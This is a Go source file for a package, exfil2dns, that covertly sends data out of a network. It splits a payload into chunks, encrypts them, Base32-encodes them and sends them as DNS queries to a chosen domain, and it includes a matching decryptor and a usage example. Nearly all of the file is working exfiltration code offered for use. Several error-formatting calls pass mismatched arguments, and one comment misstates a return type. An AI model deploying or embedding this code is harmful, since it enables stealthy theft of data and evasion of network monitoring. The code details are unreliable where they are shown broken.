// Package exfil2dns is used to exfiltrate strings using encoded DNS queries to
// a specified domain.
//
// Notes
//
// This is not meant to be "the best" or "most descrete" exfiltration over DNS
// solution. There are certainly better ways to do this, but this is a very
// simple and straightfoward example of what's possible.
//
// Exfil over DNS
//
// The idea behind exfiltrating data over DNS is more simple than it sounds. You
// start with the payload you want to send (Example: "HelloComputer!"). This
// payload is chunked into byte slices (<24 bytes) and encrypted using NaCl
// Secretbox with a specified key (Hashed with SHA256) and per-message nonce.
// The encrypted output from secretbox is then encoded in Base32 and built into
// a query string ([Base32 Encrypted Chunk].target.[Base32 Nonce].domain.).
// Finally, the DNS server is queried. Using the query string, the messages are
// then decoded and decrypted.
//
// Usage
//
// Basic code to initialize the client and exfil data:
//
//	import (
//		"log"
//
//		"github.com/CS-5/exfil2dns"
//	)
//
//	func main() {
//		client, err := exfil2dns.NewClient(
//			"cube", 
//			"example.domain", 
//			"ThisIsAKey1234", 23)
//		
//		if err != nil {
//			log.Fatal("Error creating client: " + err.Error())
//		}
//
//		/* Exfil "Here's a sneaky string" */
//		err = client.Exfil([]byte("Here's a sneaky string"))
//		if err != nil {
//			log.Fatal("Error exfiling data: " + err.Error())
//		}
//	}
package exfil2dns

/*
 * exfil2dns.go by Carson Seese. Created: 09/23/2019. Modified: 09/24/2019.
 * Data exfiltration using DNS queries.
 */

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base32"
	"errors"
	"fmt"
	"io"
	"net"
	"strings"

	"golang.org/x/crypto/nacl/secretbox"
)

/* Initialize Base32 encoder */
var b32 = base32.StdEncoding.WithPadding(base32.NoPadding)

var (
	// MaxChunk is the largest size (in bytes) a chunk can be
	MaxChunk = 23
	// MaxQueryLength is the longest a DNS query string (between the ".")
	MaxQueryLength = 63
)


// Client contains the parameters to required to encrypt and deliver the
// payload. Use NewClient() to initialize.
type Client struct {
	target, domain, server, format string
	key                    [32]byte
	chunkSize              int
}

// NewClient initializes the Client
// Target is the name of the target system. Domain is the domain to append to
// the query string. Chunk size is the max number of payload bytes per message, 
// must be <= 23.
func NewClient(target, domain, password string, chunkSize int) (Client, error) {
	return NewDevClient(target, domain, password, "", chunkSize)
}

// NewDevClient functions the same as NewClient, but sends all DNS requests to a
// custom DNS server (overriding the system's DNS resolver).
func NewDevClient(target, domain, password, server string, chunkSize int) (Client, error) {
	if chunkSize > 23 {
		return Client{},
			fmt.Errorf(
				"chunk size %v larger than max chunk size of %v", 
				chunkSize, MaxChunk,
			)
	}

	encodedT := b32.EncodeToString([]byte(target))
	if len(encodedT) > MaxQueryLength {
		return Client{}, fmt.Errorf(
			"target name %v longer than max length of %d", 
			target, MaxQueryLength,
		)
	}

	if len(domain) > 63 {
		return Client{}, fmt.Errorf(
			"domain name %v longer than max length of %d",
			domain, MaxQueryLength,
		)
	}

	format := "%s.%s.%s.%s."
	if len(domain) == 0 {
		format = "%s.%s.%s."
	}

	return Client{
		target:    encodedT,
		domain:    domain,
		key:       sha256.Sum256([]byte(password)),
		server:    server,
		format:    format,
		chunkSize: chunkSize,
	}, nil
}

// Decryptor contains the parameters required to decrypt messages from the
// exfil client. Use NewDecryptor() to initialize.
type Decryptor struct {
	key [32]byte
}

// NewDecryptor initializes Decryptor
func NewDecryptor(password string) Decryptor {
	return Decryptor{
		key: sha256.Sum256([]byte(password)),
	}
}

// ExfilString takes a string payload and exfils.
func (c *Client) ExfilString(payload string) error {
	return c.Exfil([]byte(payload))
}

// Exfil takes a byte slice payload splits it into chunks and exfils.
// Chunk lengths are declared when a client is initialized. Each chunk is
// encrypted, encoded, and sent as an individual query.
func (c *Client) Exfil(payload []byte) error {
	/* Read and chunk payload */
	in := bytes.NewReader(payload)
	chunk := make([]byte, c.chunkSize)
	for {
		n, err := in.Read(chunk)
		if n != 0 {
			/* Encode chunk as query */
			e, err := c.Encode(chunk[:n])
			if err != nil {
				return fmt.Errorf("unable to encode chunk. %v", err)
			}

			/* Send query */
			q, err := c.send(e)
			if err != nil {
				return fmt.Errorf("unable to query: %s. %w", q, err)
			}
		}
		if errors.Is(err, io.EOF) {
			break
		}
		if err != nil {
			return fmt.Errorf("payload read error: %w", err)
		}
	}
	return nil
}

// Encode takes a chunk of data, encrypts it, and returns a query
func (c *Client) Encode(chunk []byte) (string, error) {
	if len(chunk) > c.chunkSize {
		return "", fmt.Errorf(
			"chunk too large, have %d, want %d", len(chunk), c.chunkSize,
		)
	}

	/* Generate nonce */
	var nonce [24]byte
	if _, err := rand.Read(nonce[:]); nil != err {
		return "", fmt.Errorf("unable to get nonce: %w", err)
	}

	/* Encrypt chunk */
	encryptedBytes := b32.EncodeToString(
		secretbox.Seal([]byte{}, chunk, &nonce, &c.key),
	)
	if len(encryptedBytes) > MaxQueryLength {
		return "", fmt.Errorf(
			"encrypted payload longer than max length of %d", MaxQueryLength,
		)
	}

	return strings.ToLower(fmt.Sprintf(
		c.format,
		encryptedBytes,
		c.target,
		b32.EncodeToString(nonce[:]),
		c.domain),
	), nil
}

// send takes a query string and queries the system's DNS resolver. No input
// validation is performed here. When calling this function directly, use at
// your own risk.
// Note: For development, it is possible to specify a custom DNS server when
// initializing the client, however this implementation is considered a hack and
// shouldn't be relied on.
func (c *Client) send(query string) (string, error) {
	var resolver *net.Resolver

	/* If a custom DNS server is specified, use it (Development/Testing) */
	if c.server == "" {
		resolver = net.DefaultResolver
	} else {
		resolver = &net.Resolver{
			PreferGo: true,
			Dial: func(ctx context.Context,
				network, address string,
			) (net.Conn, error) {
				d := net.Dialer{}
				return d.DialContext(ctx, "udp", c.server)
			},
		}
	}
	_, err := resolver.LookupIPAddr(context.Background(), query)
	var de *net.DNSError
	if err != nil && !(errors.As(err, &de) && de.IsNotFound) {
		return "", fmt.Errorf("error resolving %s: %w", query, err)
	}
	return query, nil
}

// Decrypt takes a query string recieved and returns a 2 element string slice.
// Index 0 is the name of the target recieved and index 1 is the payload.
func (d *Decryptor) Decrypt(query string) (string, string, error) {
	/* Convert query string to upper case and split into the first 4 parts */
	parts := strings.SplitN(strings.ToUpper(query), ".", 4)
	if len(parts) < 3 {
		return "", "", fmt.Errorf("not enough parts to query")
	}

	/* Decode payload */
	payload, err := b32.DecodeString(parts[0])
	if err != nil {
		return "", "",
			fmt.Errorf("error decoding payload: %w", query, err)
	}

	/* Decode target */
	target, err := b32.DecodeString(parts[1])
	if err != nil {
		return "", "",
			fmt.Errorf("error decoding target: %w", query, err)
	}

	/* Verify Nonce */
	var nonce [24]byte
	if b32.DecodedLen(len(parts[2])) > len(nonce) {
		return "", "", fmt.Errorf("nonce too long", query)
	}

	/* Nonce */
	l, err := b32.Decode(nonce[:], []byte(parts[2]))
	if err != nil {
		return "", "",
			fmt.Errorf("error decoding nonce: %w", query, err)
	}

	if l != len(nonce) {
		return "", "", fmt.Errorf(
			"error reading nonce, have %d bytes, want %d",
			query,
			l,
			len(nonce),
		)
	}

	/* Decrypt payload */
	decrypted, ok := secretbox.Open([]byte{}, payload, &nonce, &d.key)
	if !ok {
		return "", "", fmt.Errorf("error decrypting payload", query)
	}
	return string(target), string(decrypted), nil
}
